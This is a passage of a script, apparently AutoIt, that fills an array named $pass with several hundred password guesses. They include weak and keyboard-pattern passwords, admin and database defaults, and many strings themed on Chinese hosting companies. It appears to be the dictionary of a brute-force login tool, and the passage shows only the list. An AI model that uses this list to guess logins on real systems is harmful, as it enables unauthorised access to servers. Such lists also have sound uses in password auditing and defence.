$pass[0x1b9] = "qqqqqqqq"
$pass[0x1ba] = "aaaaaa"
$pass[0x1bb] = "aaaaaaaa"
$pass[0x1bc] = "qwerasdf"
$pass[0x1bd] = "windows"
$pass[0x1be] = "qwe321"
$pass[0x1bf] = "1234rewq"
$pass[0x1c0] = "123456qwe"
$pass[0x1c1] = "qazwsxedcrfv"
$pass[0x1c2] = "ytisp!@#$bac"
$pass[0x1c3] = "adminf"
$pass[0x1c4] = "feixiang"
$pass[0x1c5] = "7730.."
$pass[0x1c6] = "654123"
$pass[0x1c7] = "4882265"
$pass[0x1c8] = "idchello.com"
$pass[0x1c9] = "177@sx7"
$pass[0x1ca] = "asd"
$pass[0x1cb] = "gmgg"
$pass[0x1cc] = "cq880331"
$pass[0x1cd] = "idc1234.com"
$pass[0x1ce] = "yingp!@#"
$pass[0x1cf] = "nimade110"
$pass[0x1d0] = "a123.123"
$pass[0x1d1] = "lkasdjf89wer2"
$pass[0x1d2] = "7730"
$pass[0x1d3] = "adminzg006...```"
$pass[0x1d4] = "xiaofang520"
$pass[0x1d5] = "chinadatas.com"
$pass[0x1d6] = "0303"
$pass[0x1d7] = "ba0260!#"
$pass[0x1d8] = "28losttempnt0go"
$pass[0x1d9] = "zhangznw588"
$pass[0x1da] = "ba0260!#%#%"
$pass[0x1db] = "ytisp123"
$pass[0x1dc] = "yzdx2011"
$pass[0x1dd] = "ytispco,.LTD!@#"
$pass[0x1de] = "asd321"
$pass[0x1df] = "idc89519"
$pass[0x1e0] = "7@177sx"
$pass[0x1e1] = "13879428.."
$pass[0x1e2] = "x1i5n3nu#2011"
$pass[0x1e3] = "ntidc!@#"
$pass[0x1e4] = "zs!lxg!fw"
$pass[0x1e5] = "dqjhjxidc123"
$pass[0x1e6] = "qingshan#@!0"
$pass[0x1e7] = "xiaochen"
$pass[0x1e8] = "a123.321"
$pass[0x1e9] = "10086...a"
$pass[0x1ea] = "123258."
$pass[0x1eb] = "123.123"
$pass[0x1ec] = "258.258"
$pass[0x1ed] = "147369."
$pass[0x1ee] = "123311"
$pass[0x1ef] = "147852"
$pass[0x1f0] = "789456."
$pass[0x1f1] = "789369"
$pass[0x1f2] = "123.456"
$pass[0x1f3] = "369333"
$pass[0x1f4] = "123789"
$pass[0x1f5] = "asd2099"
$pass[0x1f6] = "maomao"
$pass[0x1f7] = "1.1"
$pass[0x1f8] = "123.."
$pass[0x1f9] = "a123"
$pass[0x1fa] = "531idc"
$pass[0x1fb] = "lp123!njx@"
$pass[0x1fc] = "a321"
$pass[0x1fd] = "ylispidc"
$pass[0x1fe] = "idc!@#123"
$pass[0x1ff] = "zs@idc@sx"
$pass[0x200] = "canimabi"
$pass[0x201] = "1q2w3e,./"
$pass[0x202] = "nfidc2011"
$pass[0x203] = "nfidc2099"
$pass[0x204] = "idc2099"
$pass[0x205] = "idc2011"
$pass[0x206] = "nfidc89519"
$pass[0x207] = "15394391"
$pass[0x208] = "nfidcasd"
$pass[0x209] = "HUAIBEI2011"
$pass[0x20a] = "nfidc"
$pass[0x20b] = "feichi"
$pass[0x20c] = "1314520../"
$pass[0x20d] = "longkaishile"
$pass[0x20e] = "gm10571177"
$pass[0x20f] = "0578110"
$pass[0x210] = "nfidc25811"
$pass[0x211] = "#xjace!!$@"
$pass[0x212] = "gmjia"
$pass[0x213] = "gmjia12345688"
$pass[0x214] = "noparking"
$pass[0x215] = "gmjiabiexiaole"
$pass[0x216] = "gmjialieguang123"
$pass[0x217] = "gmjiaxiongdi520"
$pass[0x218] = "gmjiayangzi520"
$pass[0x219] = "gmjiawage520"
$pass[0x21a] = "gmjiadianhenai"
$pass[0x21b] = "gmjiawocaonimei"
$pass[0x21c] = "gmjiatongyuan520"
$pass[0x21d] = "aaaidc.com444284"
$pass[0x21e] = "gmjiashanren94"
$pass[0x21f] = "gmjia75nigansm"
$pass[0x220] = "gmjiayongyuan123"
$pass[0x221] = "xiao@#13798666881"
$pass[0x222] = "gmjiadianhenhao"
$pass[0x223] = "gmjiasssyyygg"
$pass[0x224] = "tangchao20!!"
$pass[0x225] = "yingp!@$#nissan"
$pass[0x226] = "hao123.com"
$pass[0x227] = "zhanglingyun3590133!@!@"
$pass[0x228] = "a123654"
$pass[0x229] = "dawei"
$pass[0x22a] = "dawei123"
$pass[0x22b] = "mail.2020idc.com"
$pass[0x22c] = "lovelong2020mail"
$pass[0x22d] = "admin@2020idc.com"
$pass[0x22e] = "lovelong2233"
$pass[0x22f] = "menglonglong1988"
$pass[0x230] = "oracl123!@#"
$pass[0x231] = "ftpuser"
$pass[0x232] = "weblogic"
$pass[0x233] = "mylove"
$pass[0x234] = "3441163"
$pass[0x235] = "zjf26388"
$pass[0x236] = "440203"
$pass[0x237] = "qwer1234"
$pass[0x238] = "3344"
$pass[0x239] = "zxcvbnm``12345"
$pass[0x23a] = "159357456"
$pass[0x23b] = "huang3669065"
$pass[0x23c] = "chemistry520"
$pass[0x23d] = "paixu!@#$%^&"
$pass[0x23e] = "ymidc"
$pass[0x23f] = "1qaz@4rfv"
$pass[0x240] = "123-456-789"
$pass[0x241] = "PINIDC.COM9477"
$pass[0x242] = "llwl507cn.1314"
$pass[0x243] = "177@cz7"
$pass[0x244] = "czidc"
$pass[0x245] = "TANGCHAO20!!"
$pass[0x246] = "czidc.com"
$pass[0x247] = "wuhusihai"
$pass[0x248] = "caonima123"
$pass[0x249] = "esincsidc"
$pass[0x24a] = "cinternet."
$pass[0x24b] = "!Q@W#E$R%T"
$pass[0x24c] = "123456a"
$pass[0x24d] = "xiaoxiao"
$pass[0x24e] = "p@ssword@WSXxinNET"
$pass[0x24f] = "123456qwerty"
$pass[0x250] = "13579"
$pass[0x251] = "147258369"
$pass[0x252] = "789789"
$pass[0x253] = "meiyoumima"
$pass[0x254] = "!QAZXSW@#EDCVFR$"
$pass[0x255] = "feitong!@#"
$pass[0x256] = "456852"
$pass[0x257] = "rst_login../"
$pass[0x258] = "666888"
$pass[0x259] = "jindun"
$pass[0x25a] = "qq123"
$pass[0x25b] = "vcenter"
$pass[0x25c] = "923133116"
$pass[0x25d] = "chuanqiqusi!"
$pass[0x25e] = "qwer123!@#"
$pass[0x25f] = "rinima"
$pass[0x260] = "sisi123"
$pass[0x261] = "local"
$pass[0x262] = "abc123!@#"
$pass[0x263] = "arp123"
$pass[0x264] = "qq.com"
$pass[0x265] = "888999"
$pass[0x266] = "1qaz@WSX"
$pass[0x267] = "gannilaomu"
$pass[0x268] = "v01.cn!@#"
$pass[0x269] = "!@#$%^123"
$pass[0x26a] = "zitian"
$pass[0x26b] = "west999"
$pass[0x26c] = "chinanet"
$pass[0x26d] = "china125"
$pass[0x26e] = "zxcvbnm,."
$pass[0x26f] = "xuxulike"
$pass[0x270] = "xuxulike.com"
$pass[0x271] = "!@#$qwerASDFzxcv"
$pass[0x272] = "147369"
$pass[0x273] = "a123456"
$pass[0x274] = "1qaz"
$pass[0x275] = "baidu.com"
$pass[0x276] = "123.com"
$pass[0x277] = "rednet"
$pass[0x278] = "12345qwert"
$pass[0x279] = "qazwsx123"
$pass[0x27a] = "123987"
$pass[0x27b] = "wangwei"
$pass[0x27c] = "china35"
$pass[0x27d] = "1122"
$pass[0x27e] = "qweqwe123"
$pass[0x27f] = "asdf!@#$"
$pass[0x280] = "9988"
$pass[0x281] = "xxx123"
$pass[0x282] = "110110110"
$pass[0x283] = "258258"
$pass[0x284] = "!QAZ2wsx"
$pass[0x285] = "5199280356"
$pass[0x286] = "yzidc"
$pass[0x287] = "yd2008slkui"
$pass[0x288] = "cinternet_yhj"
$pass[0x289] = "cinternet_yhj."
$pass[0x28a] = "xx...110"
$pass[0x28b] = "clh2869665!@#$"
$pass[0x28c] = "xzd761109"
$pass[0x28d] = "php51.90"
$pass[0x28e] = "qwe123"
$pass[0x28f] = "www.czidc.com"
$pass[0x290] = "xiaohui"
$pass[0x291] = "lee19880507"
$pass[0x292] = "china333IDC"
$pass[0x293] = "sxidc"
$pass[0x294] = "1q2w3e,./?"
$pass[0x295] = "wxj2012168"
$pass[0x296] = "admin5idc"
$pass[0x297] = "zmbbst0825"
$pass[0x298] = "sxidc.123"
$pass[0x299] = "baobeiyaojing"
$pass[0x29a] = "www.gougou.com"
$pass[0x29b] = "7758258"
$pass[0x29c] = "010203"
$pass[0x29d] = "woaini"
$pass[0x29e] = "gongxifacai"
$pass[0x29f] = "kiss&129116"
$pass[0x2a0] = "lh222"
$pass[0x2a1] = "idcidc"
$pass[0x2a2] = "wangqianyu"
$pass[0x2a3] = "jiezu"
$pass[0x2a4] = "idctest"
$pass[0x2a5] = "huangyong321"
$pass[0x2a6] = "qaz111"
$pass[0x2a7] = "a890991"
$pass[0x2a8] = "ddd123"
$pass[0x2a9] = "jjidc.com"
$pass[0x2aa] = "xiahui123"
$pass[0x2ab] = "cn1230"
$pass[0x2ac] = "07.cx"
$pass[0x2ad] = "v01.cna"
$pass[0x2ae] = "1q2w3e4r5t6y"
$pass[0x2af] = "network"
$pass[0x2b0] = ")(*&^%$#@!"
$pass[0x2b1] = "yangxianrong"
$pass[0x2b2] = "33443344"
$pass[0x2b3] = "177@dg1"
$pass[0x2b4] = "521"
$pass[0x2b5] = "idclixin"
$pass[0x2b6] = "wocaonima"
$pass[0x2b7] = "asd123456"
$pass[0x2b8] = "windows98"
$pass[0x2b9] = "xiaoma008!@#"
$pass[0x2ba] = "zzz"
$pass[0x2bb] = "778899"
$pass[0x2bc] = "www.51vip.net3000"
$pass[0x2bd] = "Alqangonet12345"
$pass[0x2be] = "hulian_2011"
$pass[0x2bf] = "q1w2e3r4t5y6u7i8o9"
$pass[0x2c0] = "liulibin840629"
$pass[0x2c1] = "c361.com"
$pass[0x2c2] = "123456aa"
$pass[0x2c3] = "www.idchy.com"
$pass[0x2c4] = "123qweasd"
$pass[0x2c5] = "idchy.com"
$pass[0x2c6] = "wei13967043055"
$pass[0x2c7] = "idchy"
$pass[0x2c8] = "xhcm2011"
$pass[0x2c9] = "vhfscp123"
$pass[0x2ca] = "34196362"
$pass[0x2cb] = "zxcvbnm,./520"
$pass[0x2cc] = "123.0"
$pass[0x2cd] = "1231234"
$pass[0x2ce] = "rainsm_kkdyw"
$pass[0x2cf] = "daijun224"
$pass[0x2d0] = "chinaidcw168"
$pass[0x2d1] = "idc123!@#"
$pass[0x2d2] = "NOD323389"
$pass[0x2d3] = "gmjiawang"
$pass[0x2d4] = "123!@#"
$pass[0x2d5] = "ZAQ12WSX"
$pass[0x2d6] = "!QAZ@WSX"
$pass[0x2d7] = "chinaidcw.com168!@#"
$pass[0x2d8] = "395zfpay_data"
$pass[0x2d9] = "TRYOIUPIUdysf768123"
$pass[0x2da] = "ytutui!@#$%^*&*(H5678"
$pass[0x2db] = "www.idchw.com"
$pass[0x2dc] = "idchw.com"
$pass[0x2dd] = "9000idc"
$pass[0x2de] = "qq0526"
$pass[0x2df] = "huachen1258zz"
$pass[0x2e0] = "8888..."
$pass[0x2e1] = "cxcx0258258"
$pass[0x2e2] = "33133..."
$pass[0x2e3] = "33133.."
$pass[0x2e4] = "bbs"
$pass[0x2e5] = "33133"
$pass[0x2e6] = "qaz000..."
$pass[0x2e7] = "biyi0791.com"
$pass[0x2e8] = "953139."
$pass[0x2e9] = "oaoidc6688"
$pass[0x2ea] = "987258"
$pass[0x2eb] = "www.3hidc.com"
$pass[0x2ec] = "#654298#"
$pass[0x2ed] = "jyx123109"
$pass[0x2ee] = "585858"
$pass[0x2ef] = ".......g"
$pass[0x2f0] = "luoshun1125"
$pass[0x2f1] = "mrgool_mrgool"
$pass[0x2f2] = "xp2010win2000"
$pass[0x2f3] = "gameidc"
$pass[0x2f4] = "xldxx***91;***93;***91;***93;"
$pass[0x2f5] = "dhlxm83840309~"
$pass[0x2f6] = "19885510"
$pass[0x2f7] = "xyidc_2006"
$pass[0x2f8] = "1234/add"
$pass[0x2f9] = "chinese2010"
$pass[0x2fa] = "gmjiaguizu"
$pass[0x2fb] = "mrgool_010"
$pass[0x2fc] = "90uxqiutian"
$pass[0x2fd] = "gtkejicai!"
$pass[0x2fe] = "95217189"
$pass[0x2ff] = "95217"
$pass[0x300] = "741852963"
$pass[0x301] = "951357"
$pass[0x302] = "456456"
$pass[0x303] = "haoeii"
$pass[0x304] = "zhouping"
$pass[0x305] = "369258147"
$pass[0x306] = "asd123!@#"
$pass[0x307] = "963852741"
$pass[0x308] = "andy"
$pass[0x309] = "v01.cnidc"
$pass[0x30a] = "963852"
$pass[0x30b] = "zhangzhao"
$pass[0x30c] = "258789"
$pass[0x30d] = "idcuser"
$pass[0x30e] = "times"
$pass[0x30f] = "stsysg@qq.com"
$pass[0x310] = "ghostsys123"
$pass[0x311] = "159357asdf"
$pass[0x312] = "qq520520--++"
$pass[0x313] = "huacheng123!@#"
$pass[0x314] = "idc2011!@#"
$pass[0x315] = "owen!@#"
$pass[0x316] = "lg@123456"
$pass[0x317] = "bai363002"
$pass[0x318] = "pass@word"
$pass[0x319] = "85021400"
$pass[0x31a] = "hao123"
$pass[0x31b] = ".......32"
$pass[0x31c] = "18003888446"
$pass[0x31d] = "40062658133"
$pass[0x31e] = "zbdgmhaoma"
$pass[0x31f] = "dabao55555"
$pass[0x320] = "4255"
$pass[0x321] = "sbwhfe"
$pass[0x322] = "yudi7766"
$pass[0x323] = "zxcvbn"
$pass[0x324] = "123456gg"
$pass[0x325] = "2011"
$pass[0x326] = "456123"
$pass[0x327] = "895623"
$pass[0x328] = "789456"
$pass[0x329] = "794613"
$pass[0x32a] = "784512"
$pass[0x32b] = "asdfgh"
$pass[0x32c] = "8762973"
$pass[0x32d] = "m&g_2008"
$pass[0x32e] = "123456654321"
$pass[0x32f] = "winner!@#"
$pass[0x330] = ")*network$@@^"
$pass[0x331] = "caony8530468"
$pass[0x332] = "84471183aa"
$pass[0x333] = "wantian##*("
$pass[0x334] = "qwe1234"
$pass[0x335] = "cjmljy881001"
$pass[0x336] = "aitangning"
$pass[0x337] = "123qwer"
$pass[0x338] = "idcji2010"
$pass[0x339] = "asd123"
$pass[0x33a] = "9001"
$pass[0x33b] = "9001a"
$pass[0x33c] = "258.852"
$pass[0x33d] = "147.741"
$pass[0x33e] = "369.963"
$pass[0x33f] = "123.321"
$pass[0x340] = "fucktlfuck49"
$pass[0x341] = "wei15874931177"
$pass[0x342] = "14361256malin"
$pass[0x343] = "yangyang"
$pass[0x344] = "19920929"
$pass[0x345] = "haoyingyulu4775652"
$pass[0x346] = "yexiaodonghappy"
$pass[0x347] = "manmancai8.com"
$pass[0x348] = "!@#lanqing0902"
$pass[0x349] = "@yh780202"
$pass[0x34a] = "wangzi123345,./"
$pass[0x34b] = "14361256malin.,"
$pass[0x34c] = "wh1979522.89"
$pass[0x34d] = "zhao520123."
$pass[0x34e] = "dhlxm83840309~!"
$pass[0x34f] = "zj124.70./*-"
$pass[0x350] = "pp123321"
$pass[0x351] = "4006266224"
$pass[0x352] = "Think#$!"
$pass[0x353] = "~!@#$^"
$pass[0x354] = "ln5203344***"
$pass[0x355] = "china999IDC"
$pass[0x356] = "wolisiyu"
$pass[0x357] = "ds.dw587~!@dd.."
$pass[0x358] = "www.9000idc.com"
$pass[0x359] = "9000idc.com!@#"
$pass[0x35a] = "460230"
$pass[0x35b] = "panlei8039"
$pass[0x35c] = "95599malin.,"
$pass[0x35d] = "SXidc!@#456"
$pass[0x35e] = "588583"
$pass[0x35f] = "china566IDC"
$pass[0x360] = "onlyidc"
$pass[0x361] = "199099"
$pass[0x362] = "a600648"
$pass[0x363] = "123322"
$pass[0x364] = "china555IDC"
$pass[0x365] = "158"
$pass[0x366] = "198787"
$pass[0x367] = "buzhidao"
$pass[0x368] = "360495003"
$pass[0x369] = "mimashiduoshao"
$pass[0x36a] = "china653IDC"
$pass[0x36b] = "china353IDC"
$pass[0x36c] = "idc"
$pass[0x36d] = "76101348"
$pass[0x36e] = "123asd"
$pass[0x36f] = "951139."
$pass[0x370] = "idcth"
$pass[0x371] = "tyidc"
$pass[0x372] = "jd8idc.com"
$pass[0x373] = "jd8idc"
$pass[0x374] = "321123"
$pass[0x375] = "esin888"
$pass[0x376] = "123456!@#"
$pass[0x377] = "12345!@#$%"
$pass[0x378] = "12345^&*()"
$pass[0x379] = "idcidcok"
$pass[0x37a] = "caonima!@#"
$pass[0x37b] = "1234abcd"
$pass[0x37c] = "caonima"
$pass[0x37d] = "www.idcquan.com"
$pass[0x37e] = "www.fj163.com"
$pass[0x37f] = "www.10idc.com"
$pass[0x380] = "notfound!"
$pass[0x381] = "gdty@))**"
$pass[0x382] = "gmidc.com"
$pass[0x383] = "123456.com"
$pass[0x384] = "qq123456.com"
$pass[0x385] = "10idc.com"
$pass[0x386] = "tianxi1000"
$pass[0x387] = "idcth.com"
$pass[0x388] = "59999"
$pass[0x389] = "321087"
$pass[0x38a] = "qqq123"
$pass[0x38b] = "951"
$pass[0x38c] = "123abc"
$pass[0x38d] = "YUDI123"
$pass[0x38e] = "870226linjin."
$pass[0x38f] = "1297225."
$pass[0x390] = "5188"
$pass[0x391] = "654321789"
$pass[0x392] = "lgy6390029"
$pass[0x393] = "winner"
$pass[0x394] = "winner!@#00"
$pass[0x395] = "!Q@W#E"
$pass[0x396] = "idc123456"
$pass[0x397] = "888idc"
$pass[0x398] = "china.com"
$pass[0x399] = "w1e2r3t4"
$pass[0x39a] = "123!@#$"
$pass[0x39b] = "}"
$pass[0x39c] = "chinadatas"
$pass[0x39d] = "nihao123"
$pass[0x39e] = "www.666idc.com"
$pass[0x39f] = "idcji2011"
$pass[0x3a0] = "666idc.com"
$pass[0x3a1] = "666idc"
$pass[0x3a2] = "www.nfvip.com"
$pass[0x3a3] = "nfvip"
$pass[0x3a4] = "2005gm.com.."
$pass[0x3a5] = "idc201103"
$pass[0x3a6] = "qq1314521"
$pass[0x3a7] = "qq5211314"
$pass[0x3a8] = "aistar123<>!N"
$pass[0x3a9] = "panshi"
$pass[0x3aa] = "v01.cn"
$pass[0x3ab] = "chinaidcok"
$pass[0x3ac] = "aaa123!@#"
$pass[0x3ad] = "www.aaaidc.com"
$pass[0x3ae] = "aaaidc"
$pass[0x3af] = "sanhe000"
$pass[0x3b0] = "xhdcgn123"
$pass[0x3b1] = "qs1234!@#"
$pass[0x3b2] = "bl-kj@123"
$pass[0x3b3] = "menglong2011"
$pass[0x3b4] = "changkun1008"
$pass[0x3b5] = "enkj.com"
$pass[0x3b6] = "enkjidc"
$pass[0x3b7] = "www.enkj.com"
$pass[0x3b8] = "idc101.com"
$pass[0x3b9] = "idc101"
$pass[0x3ba] = "dq06"
$pass[0x3bb] = "xiaozhang"
$pass[0x3bc] = "admin5201314"
$pass[0x3bd] = "warcraft"
$pass[0x3be] = "asd456"
$pass[0x3bf] = "asd789"
$pass[0x3c0] = "nihao"
$pass[0x3c1] = "5@177cz"
$pass[0x3c2] = "7@177cz"
$pass[0x3c3] = "89519"
$pass[0x3c4] = "xiaozhang123"
$pass[0x3c5] = "``11`***"
$pass[0x3c6] = "qq138849911"
$pass[0x3c7] = "www.11.com"
$pass[0x3c8] = "zxcvbn!@#"
$pass[0x3c9] = "zxcvbn123"
$pass[0x3ca] = "456"
$pass[0x3cb] = "1314"
$pass[0x3cc] = "admin@123"
$pass[0x3cd] = "Admin123"
$pass[0x3ce] = "qazwer1231"
$pass[0x3cf] = "qazqwert"
$pass[0x3d0] = "qazwert"
$pass[0x3d1] = "@dmin"
$pass[0x3d2] = "admin??"
$pass[0x3d3] = "P@$$word"
$pass[0x3d4] = "345345"
$pass[0x3d5] = "95313"
$pass[0x3d6] = "321654"
$pass[0x3d7] = "753951"
$pass[0x3d8] = "258369"
$pass[0x3d9] = "951753"
$pass[0x3da] = "P@SSWORD"
$pass[0x3db] = "super"
$pass[0x3dc] = "110"
$pass[0x3dd] = "119"
$pass[0x3de] = "qwertyuiop***91;***93;"
$pass[0x3df] = "zhangsan"
$pass[0x3e0] = "123456788"
$pass[0x3e1] = "webadmin"
$pass[0x3e2] = "WEBadmin"
$pass[0x3e3] = "login"
$pass[0x3e4] = "fuwuqi"
$pass[0x3e5] = "wlozz"
$pass[0x3e6] = "p@$$w0rd"
$pass[0x3e7] = "wentongweb"
$pass[0x3e8] = "asdasd"
$pass[0x3e9] = "fuck"
$pass[0x3ea] = "anything"
$pass[0x3eb] = "www.12345.com"
$pass[0x3ec] = "wwww.123456.com"
$pass[0x3ed] = "12345.com"
$pass[0x3ee] = "1234.com"
$pass[0x3ef] = "Password123"
$pass[0x3f0] = "feixiang!@#"
$pass[0x3f1] = "winn2000"
$pass[0x3f2] = "win2003"
$pass[0x3f3] = "1234asdf!@#"
$pass[0x3f4] = "gold1446!$$^"
$pass[0x3f5] = "admin@888"
$pass[0x3f6] = "111aaa"
$pass[0x3f7] = "123qqq"
$pass[0x3f8] = "123qqq..."
$pass[0x3f9] = "123kkk"
$pass[0x3fa] = "david"
$pass[0x3fb] = "1q2w3e4r!@#$"
$pass[0x3fc] = "321.321"
$pass[0x3fd] = "@dmin123"
$pass[0x3fe] = "@dministrator"
$pass[0x3ff] = "a123456789"
$pass[0x400] = "789klsd"
$pass[0x401] = "pa$$w0rd"
$pass[0x402] = "Pa$$s0rd"
$pass[0x403] = "samuel"
$pass[0x404] = "3H8IDC!!#"
$pass[0x405] = "3H8IDC72sanhe000"
$pass[0x406] = "sanhe000~!@#"
$pass[0x407] = "Chinawidc168"
$pass[0x408] = "Chinaidcw"
$pass[0x409] = "deoogulhk"
$pass[0x40a] = "esincs"
$pass[0x40b] = "esin.com"
$pass[0x40c] = "www.esin.com"
$pass[0x40d] = "xiaoyili"
$pass[0x40e] = "sanhe123"
$pass[0x40f] = "admin888!@#"
$pass[0x410] = "chinaidc"
$pass[0x411] = "www.123.com"
$pass[0x412] = "!@#19841010"
$pass[0x413] = "admin@456"
$pass[0x414] = "admin@789"
$pass[0x415] = "admin@!@#"
$pass[0x416] = "admin123!@#"
$pass[0x417] = "admin456!@#"
$pass[0x418] = "admin789!@#"
$pass[0x419] = "~!@#$%^&*"
$pass[0x41a] = "chinayixun"
$pass[0x41b] = "112"
$pass[0x41c] = "dragon"
$pass[0x41d] = "abcd12345"
$pass[0x41e] = "abcdabcd"
$pass[0x41f] = "abc@123"
$pass[0x420] = "abc@456"
$pass[0x421] = "htidchtidc"
$pass[0x422] = "gold!@#$%^&*"
$pass[0x423] = "zhanjiang"
$pass[0x424] = "asd456!@#"
$pass[0x425] = "asd789!@#"
$pass[0x426] = "sqladmin"
$pass[0x427] = "admin@admin"
$pass[0x428] = "admin@pass"
$pass[0x429] = "admin@mysql"
$pass[0x42a] = "lituobestsanmao"
$pass[0x42b] = "qazasd"
$pass[0x42c] = "server2003"
$pass[0x42d] = "2003server"
$pass[0x42e] = "sqlpass"
$pass[0x42f] = "zbb2011"
$pass[0x430] = "1qaz@2wsx"
$pass[0x431] = "123asd!@#"
$pass[0x432] = "8812345!@#"
$pass[0x433] = "gateway"
$pass[0x434] = "!QA@WS#ED4rf5tg"
$pass[0x435] = "!qaz@wsx"
$pass[0x436] = "baodaye"
$pass[0x437] = "idc123.123"
$pass[0x438] = "qazwsx123456"
$pass[0x439] = "qwerty123456"
$pass[0x43a] = "!q@w#e$r"
$pass[0x43b] = "q!w@e#"
$pass[0x43c] = "q!w@e#r$"
$pass[0x43d] = "!1@2#3$4"
$pass[0x43e] = "!1@2#3$4%5"
$pass[0x43f] = "!1@2#3$4%5^6"
$pass[0x440] = "qwer4321!@#$"
$pass[0x441] = "web123"
$pass[0x442] = "aaa222"
$pass[0x443] = "aaa111"
$pass[0x444] = "Password123!@#"
$pass[0x445] = "123@idc"
$pass[0x446] = "admin@idc"
$pass[0x447] = "dhmnyh"
$pass[0x448] = "q1w2Q!W@"
$pass[0x449] = "qwer123"
$pass[0x44a] = "qwer1234!@#"
$pass[0x44b] = "qwer!@"
$pass[0x44c] = "qwer!@#$"
$pass[0x44d] = "admin110"
$pass[0x44e] = "admin456"
$pass[0x44f] = "1!qaz2@wsx"
$pass[0x450] = "zbb@idc"
$pass[0x451] = "zbb2012"
$pass[0x452] = "zbb@admin"
$pass[0x453] = "admin@zbb"
$pass[0x454] = "qq2011"
$pass[0x455] = "qq2012"
$pass[0x456] = "qq@2011"
$pass[0x457] = "qq@2012"
$pass[0x458] = "admin@qq"
$pass[0x459] = "power123"
$pass[0x45a] = "admin@a123456"
$pass[0x45b] = "admin@com"
$pass[0x45c] = "1230.0"
$pass[0x45d] = "1234560.0"
$pass[0x45e] = "admin@0.0"
$pass[0x45f] = "admin0.0"
$pass[0x460] = "!@#$qwerasdf"
$pass[0x461] = "woshiguanliyuan"
$pass[0x462] = "power123.0"
$pass[0x463] = "!@#$%^&*()_+"
$pass[0x464] = "123.456.789"
$pass[0x465] = "qazzaq"
$pass[0x466] = "sysadmin"
$pass[0x467] = "qwe.123"
$pass[0x468] = "123456movie"
$pass[0x469] = "123456love"
$pass[0x46a] = "kingdee"
$pass[0x46b] = "asd111"
$pass[0x46c] = "12qw12qw"
$pass[0x46d] = "123@qwe"
$pass[0x46e] = "wutian1010"
$pass[0x46f] = "wutian"
$pass[0x470] = "wutian123"
$pass[0x471] = "wutian2012"
$pass[0x472] = "tuidc"
$pass[0x473] = "123456b"
$pass[0x474] = "123456.cn"
$pass[0x475] = "111222"
$pass[0x476] = "jiandan123"
$pass[0x477] = "jiandan"
$pass[0x478] = "jiandan1233"
$pass[0x479] = "jiandan1234"
$pass[0x47a] = "jiandan12345"
$pass[0x47b] = "xxoo"
$pass[0x47c] = "xxoo520"
$pass[0x47d] = "xxoo521"
$pass[0x47e] = "xxoo123"
$pass[0x47f] = "123.aa"
$pass[0x480] = "monitor"
$pass[0x481] = "6yhn7ujm"
$pass[0x482] = "idc0000"
$pass[0x483] = "intel"
$pass[0x484] = "9y3x5m2lj"
$pass[0x485] = "user3"
$pass[0x486] = "net"
$pass[0x487] = "pass123"
$pass[0x488] = "pass1234"
$pass[0x489] = "passe"
$pass[0x48a] = "passw"
$pass[0x48b] = "password12"
$pass[0x48c] = "prueba"
$pass[0x48d] = "open"
$pass[0x48e] = "system32"
$pass[0x48f] = "username"
$pass[0x490] = "admins"
$pass[0x491] = "007"
$pass[0x492] = "007007"
$pass[0x493] = "01235"
$pass[0x494] = "0246"
$pass[0x495] = "0249"
$pass[0x496] = "112112"
$pass[0x497] = "1123"
$pass[0x498] = "1133"
$pass[0x499] = "113355"
$pass[0x49a] = "1212"
$pass[0x49b] = "121212"
$pass[0x49c] = "1225"
$pass[0x49d] = "1313"
$pass[0x49e] = "1a2b3c"
$pass[0x49f] = "1qw23e"
$pass[0x4a0] = "1qwerty"
$pass[0x4a1] = "2004"
$pass[0x4a2] = "2006"
$pass[0x4a3] = "2009"
$pass[0x4a4] = "2112"
$pass[0x4a5] = "332211"
$pass[0x4a6] = "6969"
$pass[0x4a7] = "696969"
$pass[0x4a8] = "aa"
$pass[0x4a9] = "aaa"
$pass[0x4aa] = "abc"
$pass[0x4ab] = "backup"
$pass[0x4ac] = "ftp"
$pass[0x4ad] = "alex"
$pass[0x4ae] = "good"
$pass[0x4af] = "php"
$pass[0x4b0] = "q"
$pass[0x4b1] = "r00t"
$pass[0x4b2] = "reseller"
$pass[0x4b3] = "success"
$pass[0x4b4] = "olga"
$pass[0x4b5] = "zaxscd"
$pass[0x4b6] = "zsxdc"
$pass[0x4b7] = "zxcasd"
$pass[0x4b8] = "zxcvb"
$pass[0x4b9] = "1010"
$pass[0x4ba] = "101010"
$pass[0x4bb] = "1221"
$pass[0x4bc] = "12321"
$pass[0x4bd] = "2323"
$pass[0x4be] = "232323"
$pass[0x4bf] = "account"
$pass[0x4c0] = "daniel"
$pass[0x4c1] = "data"
$pass[0x4c2] = "director"
$pass[0x4c3] = "manage"
$pass[0x4c4] = "manager1"
$pass[0x4c5] = "P@ssword"
$pass[0x4c6] = "qwert"
$pass[0x4c7] = "sa"
$pass[0x4c8] = "server1"
$pass[0x4c9] = "setup"
$pass[0x4ca] = "superuser"
$pass[0x4cb] = "support1"
$pass[0x4cc] = "system1"
$pass[0x4cd] = "administrator1"
$pass[0x4ce] = "sysadmin1"
$pass[0x4cf] = "P@ssw0rd1"
$pass[0x4d0] = "wordpass"
$pass[0x4d1] = "Pa$$word"
$pass[0x4d2] = "Passw0rd1"
$pass[0x4d3] = "nopassword"
$pass[0x4d4] = "pasword"
$pass[0x4d5] = "p@ssword"
$pass[0x4d6] = "p@ss"
$pass[0x4d7] = "pass1"
$pass[0x4d8] = "Support"
$pass[0x4d9] = "120"
$pass[0x4da] = "113"
$pass[0x4db] = "114"
$pass[0x4dc] = "123000"
$pass[0x4dd] = "123111"
$pass[0x4de] = "aaa123"
$pass[0x4df] = "abc123456"
$pass[0x4e0] = "1230.."
$pass[0x4e1] = "zxcasdqwe"
$pass[0x4e2] = "admiadmin"
$pass[0x4e3] = "110110"
$pass[0x4e4] = "guest"
$pass[0x4e5] = "123.idc"
$pass[0x4e6] = "!@QWASZX"
$pass[0x4e7] = "123a"
$pass[0x4e8] = "789"
$pass[0x4e9] = "qwert12345"
$pass[0x4ea] = "123456789a"
$pass[0x4eb] = "idc2010"
$pass[0x4ec] = "idc2012"
$pass[0x4ed] = "guanli"
$pass[0x4ee] = "qqaazz"
$pass[0x4ef] = "147"
$pass[0x4f0] = "258"
$pass[0x4f1] = "369"
$pass[0x4f2] = "Pass@word"
$pass[0x4f3] = "admin!@#"
$pass[0x4f4] = "abc!@#"
$pass[0x4f5] = "fuckyou"
$pass[0x4f6] = "ILoveyou"
$pass[0x4f7] = "111qqq..."
$pass[0x4f8] = "235689"
$pass[0x4f9] = "326598"
$pass[0x4fa] = "qq123.com"
$pass[0x4fb] = "10000"
